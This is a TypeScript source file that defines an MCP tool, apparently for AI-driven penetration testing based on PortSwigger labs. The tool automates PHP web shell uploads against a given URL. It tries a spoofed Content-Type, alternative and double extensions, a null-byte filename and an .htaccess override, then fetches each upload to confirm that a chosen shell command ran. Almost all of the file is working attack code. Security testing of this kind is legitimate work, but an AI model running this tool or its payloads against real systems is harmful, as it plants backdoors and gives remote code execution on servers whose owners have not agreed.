/**
 * File Upload testing tools.
 *
 * Tests web shell upload with Content-Type bypass and extension variants.
 * Based on PortSwigger File Upload labs.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

export function register(server: McpServer): void {
  server.tool(
    "file_upload_test",
    "Test web shell upload with Content-Type bypass variants. Attempts to upload a PHP web shell using various techniques: 1) Direct .php upload 2) .php with image/jpeg Content-Type (Content-Type bypass) 3) Alternative extensions (.php5, .phtml, .phar, .php7, .phps) 4) Double extension (.php.jpg) 5) Null byte (.php%00.jpg). After each upload, attempts to access the uploaded file to check execution. Returns: {results: [{technique, upload_status, execution_status, output, successful}]}. Side effects: Uploads files to the server. May achieve remote code execution.",
    {
      url: z
        .string()
        .describe(
          "Base URL of the target application, e.g. https://target.com"
        ),
      upload_endpoint: z
        .string()
        .describe(
          "Upload endpoint path, e.g. /my-account/avatar or /api/upload"
        ),
      upload_field: z
        .string()
        .describe(
          "Form field name for the file upload, e.g. 'avatar', 'file', 'upload'"
        )
        .default("file"),
      upload_path_prefix: z
        .string()
        .describe(
          "Path where uploaded files are accessible, e.g. /files/avatars/"
        )
        .default("/files/avatars/"),
      auth_cookie: z
        .string()
        .optional()
        .describe("Session cookie for authenticated uploads"),
      shell_command: z
        .string()
        .describe("Command the PHP shell should execute")
        .default("id"),
      extra_fields: z
        .string()
        .optional()
        .describe(
          "Additional form fields, e.g. 'user=test&csrf=abc123'"
        ),
    },
    async ({
      url,
      upload_endpoint,
      upload_field,
      upload_path_prefix,
      auth_cookie,
      shell_command,
      extra_fields,
    }) => {
      requireTool("curl");

      const fullUploadUrl = `${url.replace(/\/$/, "")}${upload_endpoint}`;
      const shellContent = `<?php echo system("${shell_command}"); ?>`;

      const testCases: [string, string, string, string][] = [
        ["direct_php", "shell.php", "application/x-php", shellContent],
        ["content_type_bypass", "shell.php", "image/jpeg", shellContent],
        ["php5_extension", "shell.php5", "application/x-php", shellContent],
        ["phtml_extension", "shell.phtml", "application/x-php", shellContent],
        ["phar_extension", "shell.phar", "application/x-php", shellContent],
        ["php7_extension", "shell.php7", "application/x-php", shellContent],
        ["double_extension", "shell.php.jpg", "image/jpeg", shellContent],
        ["null_byte", "shell.php%00.jpg", "application/x-php", shellContent],
        [
          "htaccess_override",
          ".htaccess",
          "text/plain",
          "AddType application/x-httpd-php .xyz",
        ],
      ];

      const results: Array<{
        technique: string;
        filename: string;
        content_type_sent: string;
        upload_status: number;
        upload_response_snippet: string;
        execution_status: number;
        execution_output: string;
        shell_executed: boolean;
      }> = [];

      for (const [technique, filename, contentType, content] of testCases) {
        // Write the shell content to a temp file
        const tmpPath = path.join(
          os.tmpdir(),
          `operant_${Date.now()}_${filename.replace(/[^a-zA-Z0-9._-]/g, "_")}`
        );
        fs.writeFileSync(tmpPath, content, "utf-8");

        try {
          // Build curl upload command
          const curlArgs: string[] = [
            "-sk",
            "-o",
            "-",
            "-w",
            "\n__META__%{http_code}:%{size_download}",
            "-X",
            "POST",
            "-F",
            `${upload_field}=@${tmpPath};filename=${filename};type=${contentType}`,
          ];

          // Add extra form fields
          if (extra_fields) {
            for (const pair of extra_fields.split("&")) {
              if (pair.includes("=")) {
                curlArgs.push("-F", pair);
              }
            }
          }

          if (auth_cookie) {
            curlArgs.push("-b", auth_cookie);
          }
          curlArgs.push(fullUploadUrl);

          const res = await runCmd("curl", curlArgs);
          let body = res.stdout;
          const metaMarker = body.lastIndexOf("__META__");
          let uploadStatus = 0;
          if (metaMarker !== -1) {
            const meta = body.slice(metaMarker + 8).trim();
            const parts = meta.split(":");
            uploadStatus = parts.length > 0 ? parseInt(parts[0], 10) || 0 : 0;
            body = body.slice(0, metaMarker);
          }

          // Try to access the uploaded file
          // Handle special filename cases
          let accessFilename: string | null = filename;
          if (filename.includes("%00")) {
            accessFilename = filename.split("%00")[0];
          }
          if (technique === "htaccess_override") {
            // After uploading .htaccess, skip access check for .htaccess itself
            accessFilename = null;
          }

          let executionStatus = 0;
          let execOutput = "";
          if (
            accessFilename !== null &&
            [200, 201, 302].includes(uploadStatus)
          ) {
            const accessUrl = `${url.replace(/\/$/, "")}${upload_path_prefix.replace(/\/$/, "")}/${accessFilename}`;
            const execArgs: string[] = ["-sk", accessUrl];
            if (auth_cookie) {
              execArgs.push("-b", auth_cookie);
            }

            const execRes = await runCmd("curl", execArgs);
            execOutput = execRes.stdout;

            // Check if we got the raw PHP or executed output
            const execArgsStatus: string[] = [
              "-sk",
              "-o",
              "/dev/null",
              "-w",
              "%{http_code}",
              accessUrl,
            ];
            if (auth_cookie) {
              execArgsStatus.push("-b", auth_cookie);
            }
            const statusRes = await runCmd("curl", execArgsStatus);
            executionStatus = /^\d+$/.test(statusRes.stdout)
              ? parseInt(statusRes.stdout, 10)
              : 0;
          }

          // Determine if shell executed (output should NOT contain <?php)
          const shellExecuted =
            executionStatus === 200 &&
            execOutput.length > 0 &&
            !execOutput.includes("<?php");

          results.push({
            technique,
            filename,
            content_type_sent: contentType,
            upload_status: uploadStatus,
            upload_response_snippet: body.slice(0, 300),
            execution_status: executionStatus,
            execution_output: execOutput ? execOutput.slice(0, 500) : "",
            shell_executed: shellExecuted,
          });
        } finally {
          try {
            fs.unlinkSync(tmpPath);
          } catch {
            // ignore cleanup errors
          }
        }
      }

      const successful = results.filter((r) => r.shell_executed);
      const result = {
        results,
        successful_techniques: successful.map((r) => r.technique),
        rce_achieved: successful.length > 0,
        hint:
          successful.length > 0
            ? `Remote code execution achieved via ${JSON.stringify(successful.map((r) => r.technique))}!`
            : "No shell execution detected. Server may validate file content or block PHP execution.",
      };

      return { content: [{ type: "text", text: JSON.stringify(result, null, 2) }] };
    }
  );
}
